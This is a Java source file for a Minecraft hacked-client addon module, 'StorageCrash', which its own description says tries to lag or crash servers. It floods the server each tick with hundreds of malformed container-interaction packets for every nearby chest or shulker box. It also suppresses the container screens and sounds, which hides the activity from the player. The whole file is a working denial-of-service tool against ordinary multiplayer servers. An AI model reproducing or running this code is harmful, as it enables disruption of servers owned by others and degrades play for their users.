package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.world.BlockIterator;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.AbstractChestBlock;
import net.minecraft.block.ShulkerBoxBlock;
import net.minecraft.client.gui.screen.ingame.AbstractInventoryScreen;
import net.minecraft.client.gui.screen.ingame.HandledScreen;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.lwjgl.glfw.GLFW;

public class StorageCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per container block per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMin(1)
            .sliderMax(1000)
            .build()
    );

    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
            .name("no-sound")
            .description("Blocks the noisy container opening/closing sounds.")
            .defaultValue(false)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Integer> sequence = sgGeneral.add(new IntSetting.Builder()
            .name("sequence")
            .description("Choose the sequence")
            .defaultValue(0)
            .min(0)
            .sliderMin(0)
            .sliderMax(1000)
            .build()
    );

    public StorageCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "storage-crash", "CRYSTAL || Attempts to lag / crash servers by sending broken storage opening packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (GLFW.glfwGetKey(mc.getWindow().getHandle(), GLFW.GLFW_KEY_ESCAPE) == GLFW.GLFW_PRESS) {
            toggle();
            mc.player.closeHandledScreen();
            return;
        }
        BlockIterator.register(4, 4, ((blockPos, blockState) -> {
            if (blockState.getBlock() instanceof AbstractChestBlock || blockState.getBlock() instanceof ShulkerBoxBlock) {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
                            Hand.MAIN_HAND,
                            new BlockHitResult(new Vec3d(
                                    blockPos.getX(),
                                    blockPos.getY(),
                                    blockPos.getZ()),
                                    Direction.DOWN,
                                    blockPos,
                                    false),
                            sequence.get()));
            }
        }));
    }

    @EventHandler
    private void onScreenOpen(OpenScreenEvent event) {
        if (event.screen == null) return;
        if (!event.screen.shouldPause() && !(event.screen instanceof AbstractInventoryScreen) && (event.screen instanceof HandledScreen)) event.setCancelled(true);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (noSound.get() && shouldCancel(event)) event.setCancelled(true);
    }

    private boolean shouldCancel(PlaySoundEvent event) {
        return event.sound.getId().toString().equals("minecraft:block.chest.open") || event.sound.getId().toString().equals("minecraft:block.chest.close") || event.sound.getId().toString().equals("minecraft:block.shulker_box.open") || event.sound.getId().toString().equals("minecraft:block.shulker_box.close") || event.sound.getId().toString().equals("minecraft:block.ender_chest.open") || event.sound.getId().toString().equals("minecraft:block.ender_chest.close");
    }
}